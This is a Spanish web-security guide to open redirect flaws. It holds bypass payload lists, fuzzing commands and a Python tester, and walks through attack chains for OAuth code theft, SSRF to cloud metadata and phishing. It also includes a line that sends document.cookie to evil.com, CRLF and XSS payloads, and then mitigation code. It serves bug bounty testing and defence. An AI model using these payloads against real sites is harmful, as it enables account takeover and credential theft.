---
title: "Open Redirect"
description: "Redirección a un destino controlado por el atacante por validación débil del parámetro de retorno (?next=, ?url=, ?redirect=)."
category: "Web"
date: 2026-07-18
---
# Open Redirect

Un **Open Redirect** ocurre cuando una aplicación acepta un valor controlado por el usuario como destino de redirección sin validarlo correctamente. El servidor responde con un `3xx` (normalmente `302 Found`) cuyo header `Location` apunta a un dominio arbitrario. Aunque a primera vista parece de bajo impacto, es un primitivo esencial para cadenas de ataque que derivan en robo de cuentas, SSRF y phishing de alta credibilidad.

## Por que importa

- **Confianza del dominio**: el enlace parte de un dominio legítimo, lo que engana filtros de correo, proxies corporativos y la intuición del usuario.
- **Primitivo de cadena**: es el eslabón que conecta vulnerabilidades de impacto bajo con impacto crítico (OAuth token theft, SSRF a metadatos cloud, cache poisoning).
- **Prevalencia**: presente en casi toda aplicación que implementa login, logout, SSO o compartición de enlaces.

---

## Donde buscar

### Parametros clasicos

Cualquier parámetro que controle el destino tras una acción (login, logout, consentimiento OAuth, confirmación de email):

| Parametro | Ejemplo |
|-----------|---------|
| `next` | `/login?next=https://evil.com` |
| `url` | `/redirect?url=https://evil.com` |
| `redirect` | `/auth/callback?redirect=https://evil.com` |
| `redirect_uri` | `/oauth/authorize?redirect_uri=https://evil.com` |
| `return` | `/logout?return=https://evil.com` |
| `returnTo` | `/sso/login?returnTo=https://evil.com` |
| `continue` | `/verify?continue=https://evil.com` |
| `dest` | `/go?dest=https://evil.com` |
| `rurl` | `/out?rurl=https://evil.com` |
| `target` | `/click?target=https://evil.com` |
| `view` | `/page?view=https://evil.com` |

### Flujos especificos

| Flujo | Punto de inyeccion |
|-------|--------------------|
| **OAuth 2.0 / OIDC** | `redirect_uri` en `/authorize`. Si el IdP permite subdirectorios o wildcards laxos, se puede redirigir el `code` a un dominio atacante. |
| **SAML SSO** | `RelayState` en la respuesta SAML. |
| **Login/Logout** | Parametro `next`, `returnTo`, `post_logout_redirect_uri`. |
| **Link trackers** | `/click?url=`, `/go?link=`, servicios de acortamiento internos. |
| **Compartir contenido** | Botones "compartir en X" que pasan la URL destino como parámetro. |
| **Emails transaccionales** | Links de confirmación/reset con parámetro de retorno embebido. |
| **JavaScript redirects** | `window.location = params.get('url')` en el cliente (open redirect del lado cliente). |

### Headers como vector

Algunas aplicaciones redirigen en función de headers HTTP:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

Si el backend construye la URL de redirección con el valor de `X-Forwarded-Host` o `Host`, se produce un redirect controlado sin necesidad de parámetro en la query string.

---

## Tabla de bypasses

Cuando la aplicación valida el destino pero de forma incompleta, estas técnicas permiten evadir el filtro:

| Tecnica | Payload | Por que funciona |
|---------|---------|------------------|
| Protocol-relative | `//evil.com` | El navegador interpreta `//` como "mismo esquema, otro host". |
| Sin esquema con barra | `/\/evil.com` | Algunos parsers normalizan `\/` a `//`. |
| Backslash | `\evil.com` o `/\evil.com` | Navegadores (especialmente Chrome) normalizan `\` a `/`. |
| Arroba (credential section) | `https://trusted.com@evil.com` | RFC 3986: lo antes del `@` es userinfo; el host real es `evil.com`. |
| Subdominio falso | `https://trusted.com.evil.com` | El dominio real es `evil.com`; `trusted.com` es un subdominio de él. |
| Punto final (trailing dot) | `https://evil.com.` | DNS ignora el trailing dot; algunos parsers no lo comparan con la allowlist. |
| Fragment confusion | `https://trusted.com%23.evil.com` | `%23` = `#`; el parser puede tratar lo posterior como fragment y no validar el host. |
| Doble encoding | `https://evil%252ecom` | Primera decodificación: `evil%2ecom`. Segunda: `evil.com`. Si el server decodifica dos veces. |
| Null byte | `https://trusted.com%00.evil.com` | Lenguajes con strings C-style truncan en `\0`; el parser ve `trusted.com`, el navegador `evil.com`. |
| Tab / newline | `https://evil%09.com` | Algunos parsers ignoran `\t` y `\n` dentro de la URL. |
| Unicode normalization | `https://evil.com` o con homógrafos | Normalización NFKC puede reconstruir la URL maliciosa tras la validación. |
| CRLF injection | `https://trusted.com%0d%0aLocation:%20https://evil.com` | Si el valor se refleja en un header, inyecta un segundo `Location`. |
| Data URI | `data:text/html,<script>location='https://evil.com'</script>` | Algunos handlers aceptan `data:` como esquema válido. |
| JavaScript URI | `javascript:location='https://evil.com'` | Redirect del lado cliente si el valor se usa en `href` o `window.location`. |
| Esquema exotico | `https:evil.com` (sin `//`) | Comportamiento no estándar: algunos navegadores redirigen a `evil.com`. |
| Path traversal en redirect | `https://trusted.com/../../evil.com` | Si el server resuelve paths antes de redirigir. |
| Whitespace leading | ` https://evil.com` (espacio al inicio) | Algunos parsers ignoran whitespace inicial. |
| Encoded slash | `https://trusted.com%2F@evil.com` | `%2F` = `/`; si se decodifica después de la validación, el host cambia. |
| IPv6 embed | `https://[::ffff:7f00:1]` | Representación IPv6 que apunta a `127.0.0.1`; útil en cadenas SSRF. |
| Open redirect via meta refresh | Inyectar `<meta http-equiv="refresh" content="0;url=https://evil.com">` si hay HTML injection. |

### Payloads combinados

```
//evil.com
///evil.com
////evil.com
/\/evil.com
/\evil.com
https://trusted.com@evil.com
https://trusted.com%40evil.com
https://evil.com%23trusted.com
https://trusted.com%00@evil.com
//evil%00.com
/%0d/evil.com
/%09/evil.com
//trusted.com@evil.com
///trusted.com@evil.com
https:evil.com
data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=
javascript:fetch('https://evil.com/?c='+document.cookie)
```

---

## Metodologia de testing

### 1. Descubrimiento de parametros

Crawlear la aplicación buscando parámetros de redirección. Usar la wordlist de parámetros conocidos:

```bash
# Con ffuf: fuzzing de parámetros de redirección
ffuf -u "https://target.com/login?FUZZ=https://evil.com" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mc 301,302,303,307,308 \
     -fr "error|invalid"

# Con Arjun: descubrimiento automático de parámetros
arjun -u "https://target.com/login" --stable
```

### 2. Verificacion basica

```bash
# Probar redirect directo
curl -ski "https://target.com/login?next=https://evil.com" | grep -i "^location:"

# Verificar que el servidor responde con 3xx
curl -o /dev/null -sw '%{http_code} %{redirect_url}\n' \
     "https://target.com/login?next=https://evil.com"
```

### 3. Fuzzing de bypasses

```bash
# Generar payloads de bypass y fuzzear
cat open_redirect_payloads.txt | while read payload; do
  status=$(curl -o /dev/null -sw '%{http_code}' "https://target.com/login?next=${payload}")
  location=$(curl -ski "https://target.com/login?next=${payload}" | grep -i "^location:" | head -1)
  echo "[${status}] ${payload} -> ${location}"
done
```

### 4. Analisis con Burp Suite

1. **Proxy** -> interceptar peticiones con parámetros de redirección.
2. **Intruder** -> cargar la lista de bypasses como payload en el parámetro.
3. **Match and Replace** -> filtrar respuestas con `Location:` que contengan tu dominio.
4. **Logger++** (extensión) -> filtrar por `302` y buscar patrones de redirect.

### 5. Redirect del lado cliente (DOM-based)

Buscar en el JavaScript de la aplicación patrones inseguros:

```javascript
// Patrones vulnerables en el código del cliente
window.location = new URLSearchParams(window.location.search).get('url');
window.location.href = document.referrer;
location.assign(someUserInput);
location.replace(getParam('redirect'));
document.location = hash.split('redirect=')[1];
```

Para encontrarlos automáticamente:

```bash
# Buscar sinks de redirección en JS descargados
grep -rE "(window\.location|document\.location|location\.(href|assign|replace))\s*=" js_files/
```

---

## Chaining en detalle

### OAuth token theft (Open Redirect -> ATO)

Esta es la cadena de mayor impacto. Si el IdP permite un `redirect_uri` que apunta a un endpoint con open redirect, el flujo es:

```
1. Atacante construye URL de autorización:
   https://idp.com/authorize?
     client_id=LEGIT_APP&
     redirect_uri=https://app.com/callback/../../redirect?url=https://evil.com&
     response_type=code&
     scope=openid profile email

2. Víctima hace clic (enlace en phishing, chat, etc.)

3. IdP valida redirect_uri contra el patrón registrado.
   Si el patrón es "https://app.com/*" o valida solo el prefijo,
   el path traversal / open redirect pasa la validación.

4. IdP redirige a:
   https://app.com/callback/../../redirect?url=https://evil.com&code=AUTH_CODE_AQUI

5. app.com procesa el open redirect y envía al usuario a:
   https://evil.com&code=AUTH_CODE_AQUI

6. evil.com captura el authorization code del parámetro/fragment.

7. Atacante intercambia el code por un access_token:
   POST https://idp.com/token
   grant_type=authorization_code&code=AUTH_CODE_AQUI&redirect_uri=...

8. Atacante tiene acceso a la cuenta de la víctima.
```

**Variante con `response_type=token` (implicit flow)**: el token viaja en el fragment (`#access_token=...`). El fragment no se envía al servidor, pero si `evil.com` tiene JavaScript que lo lee (`window.location.hash`), el token se captura igualmente.

### SSRF via redirect

```
1. Aplicación interna hace fetch a URL proporcionada por el usuario.
2. La URL apunta a un endpoint con open redirect:
   https://app-interna.com/redirect?url=http://169.254.169.254/latest/meta-data/

3. El servidor sigue el redirect y accede al servicio de metadatos cloud.
4. La respuesta (credenciales IAM, tokens) se devuelve al atacante.
```

Funciona cuando:
- El servidor sigue redirects automáticamente (comportamiento por defecto de `curl`, `requests`, `HttpClient`).
- No hay validación post-redirect del destino final.
- El servicio de metadatos no requiere headers especiales (IMDSv1 en AWS).

### Phishing de alta credibilidad

```
1. Atacante registra dominio similar: app-security-update.com
2. Clona la página de login de app.com
3. Construye enlace:
   https://app.com/redirect?next=https://app-security-update.com/login
4. La víctima ve "app.com" en la barra de direcciones, confía, hace clic.
5. El redirect lleva a la página clonada; la víctima introduce credenciales.
```

Impacto amplificado cuando:
- El dominio legítimo tiene certificado EV (barra verde).
- El email de phishing pasa SPF/DKIM porque usa infraestructura legítima del dominio.

### Cache poisoning via redirect

```
1. Página cacheada con redirect basado en parámetro/header.
2. Atacante envía:
   GET /page HTTP/1.1
   Host: target.com
   X-Forwarded-Host: evil.com

3. Si el backend genera un redirect a evil.com y la CDN lo cachea:
   Todos los usuarios que visiten /page serán redirigidos a evil.com
   hasta que expire la caché.
```

### XSS via javascript: URI

Si la aplicación redirige del lado cliente usando `location.href = userInput` y no filtra el esquema:

```javascript
// Payload en el parámetro de redirección
javascript:alert(document.cookie)

// Encoded para evadir filtros básicos
javascript:alert%28document.cookie%29
```

---

## Herramientas

### Wordlists de payloads

```bash
# SecLists - payloads de open redirect
/usr/share/seclists/Fuzzing/open-redirect-payloads.txt

# PayloadsAllTheThings
git clone https://github.com/swisskyrepo/PayloadsAllTheThings
cat PayloadsAllTheThings/Open\ Redirect/README.md
```

### Script de testing automatizado

```python
#!/usr/bin/env python3
"""open_redirect_tester.py - Testea bypasses de open redirect."""
import requests
import sys
from urllib.parse import quote

TARGET = sys.argv[1]  # e.g., https://target.com/login?next=
CANARY = "evil.com"

PAYLOADS = [
    f"https://{CANARY}",
    f"//{CANARY}",
    f"///{CANARY}",
    f"/\\{CANARY}",
    f"https://trusted.com@{CANARY}",
    f"https://trusted.com%40{CANARY}",
    f"https://{CANARY}%23trusted.com",
    f"https://trusted.com%00@{CANARY}",
    f"https:{CANARY}",
    f"/%09/{CANARY}",
    f"/%0d/{CANARY}",
    f"https://trusted.com.{CANARY}",
]

for payload in PAYLOADS:
    try:
        r = requests.get(
            TARGET + quote(payload, safe="/:@%#?&="),
            allow_redirects=False,
            timeout=10,
        )
        location = r.headers.get("Location", "")
        if CANARY in location:
            print(f"[VULN] {r.status_code} | {payload}")
            print(f"       Location: {location}")
        else:
            print(f"[SAFE] {r.status_code} | {payload}")
    except Exception as e:
        print(f"[ERR]  {payload} -> {e}")
```

```bash
# Uso
python3 open_redirect_tester.py "https://target.com/login?next="
```

### Burp Suite

- **Intruder**: payload positions en el parámetro de redirect, cargar lista de bypasses.
- **Match/Replace rule**: agregar regla para detectar `Location:` con tu dominio canario.
- **Collaborator**: usar URL de Collaborator como destino para confirmar redirect out-of-band.
- **Extension Open Redirect Scanner** (BApp Store): detección automática.

### Nuclei

```bash
# Template específico de open redirect
nuclei -u https://target.com -t http/vulnerabilities/open-redirect-generic.yaml

# Todos los templates de redirect
nuclei -u https://target.com -tags redirect
```

---

## Deteccion y mitigacion

### Validacion correcta (allowlist estricta)

```python
from urllib.parse import urlparse

ALLOWED_HOSTS = {"app.com", "www.app.com", "cdn.app.com"}

def safe_redirect(url: str) -> bool:
    """Valida que el destino del redirect es un host permitido."""
    try:
        parsed = urlparse(url)
    except ValueError:
        return False

    # Rechazar esquemas peligrosos
    if parsed.scheme not in ("https", "http", ""):
        return False

    # Rechazar URLs sin host (protocol-relative, data:, javascript:)
    if not parsed.hostname:
        return False

    # Comparar contra allowlist exacta
    if parsed.hostname not in ALLOWED_HOSTS:
        return False

    # Rechazar userinfo (user:pass@host)
    if parsed.username or parsed.password:
        return False

    return True
```

### Errores comunes de validacion

| Error | Ejemplo | Problema |
|-------|---------|----------|
| Validar solo el prefijo | `url.startswith("https://trusted.com")` | `https://trusted.com.evil.com` pasa. |
| Validar con `in` | `"trusted.com" in url` | `https://evil.com/trusted.com` pasa. |
| Regex sin ancla | `re.match(r"https://trusted\.com", url)` | `https://trusted.com.evil.com` pasa (match parcial). |
| No normalizar antes de validar | Comparar URL raw | Bypasses con encoding, unicode, backslash. |
| Validar pre-redirect pero no post-decode | Decodificar después de validar | Double encoding bypasses. |
| Permitir paths relativos sin validar | `/redirect?next=/dashboard` | `//evil.com` es path-relative y redirige fuera. |
| Ignorar el fragment | No considerar `#` | Fragment confusion con `%23`. |
| Confiar en `Referer` | Redirect al Referer sin validar | Atacante controla el Referer. |

### Mitigaciones recomendadas

1. **Allowlist de hosts**: solo redirigir a dominios conocidos, comparados contra `urlparse().hostname`.
2. **No redirigir a URLs absolutas del usuario**: usar identificadores internos mapeados a URLs (`/redirect?id=dashboard` en vez de `?next=https://...`).
3. **Token anti-tampering**: firmar el destino con HMAC. El servidor verifica la firma antes de redirigir.
4. **Página intermedia**: mostrar "Estás saliendo de app.com hacia [destino]. Continuar?" para destinos externos.
5. **CSP**: `navigate-to` (experimental) puede limitar los destinos de navegación.
6. **Sanitizar doble**: decodificar la URL completamente antes de validar (previene double encoding).
7. **Rechazar esquemas no-HTTP**: filtrar `javascript:`, `data:`, `vbscript:`, etc.

---

## Ejemplos reales en bug bounty

| Programa | Tecnica | Impacto | Referencia |
|----------|---------|---------|------------|
| HackerOne (propio) | Open redirect en `/redirect?url=` con bypass `//evil.com` | Phishing desde dominio HackerOne | Reporte publico H1 |
| Google | Open redirect en Google Login encadenado con OAuth para robo de token | ATO via OAuth token theft | Google VRP |
| Facebook | Redirect en `l.facebook.com` con encoding bypass | Phishing de alta credibilidad | Facebook Bug Bounty |
| Uber | Open redirect en SSO combinado con CSRF | Account takeover | Reporte publico H1 |
| Yahoo | `login.yahoo.com` redirect via `redirect_uri` manipulation | Token theft | Yahoo Bug Bounty |
| Airbnb | DOM-based redirect via `window.location = getParam('redirect')` | XSS/Phishing | Reporte publico |

> Nota: los detalles exactos de estos reportes son públicos en las plataformas de bug bounty correspondientes. Consultar HackerOne Hacktivity y los programas VRP de cada vendor para los reportes completos.

---

## Severidad y triaje

| Escenario | CVSS estimado | Severidad tipica |
|-----------|---------------|------------------|
| Open redirect aislado (sin cadena) | 4.3 - 5.3 | Low / Medium |
| Open redirect + phishing creíble | 5.3 - 6.1 | Medium |
| Open redirect + OAuth token theft | 7.5 - 9.1 | High / Critical |
| Open redirect + SSRF a metadatos cloud | 7.5 - 9.8 | High / Critical |
| Open redirect + cache poisoning | 6.5 - 8.1 | Medium / High |
| DOM-based redirect -> XSS | 6.1 - 8.8 | Medium / High |

> En muchos programas de bug bounty, un open redirect aislado se clasifica como **informativo o low**. El impacto sube significativamente cuando se demuestra una cadena viable.

---

## Relacionado

- **Autenticacion Web** -- OAuth redirect_uri manipulation
- **Cache Poisoning y Web Cache Deception** -- redirect cache poisoning
- **CSRF moderno** -- SameSite bypass via redirect
- **Host Header Injection** -- redirect basado en Host
- **Metodologia Bug Bounty**
- **SSRF** -- redireccion a metadata endpoints
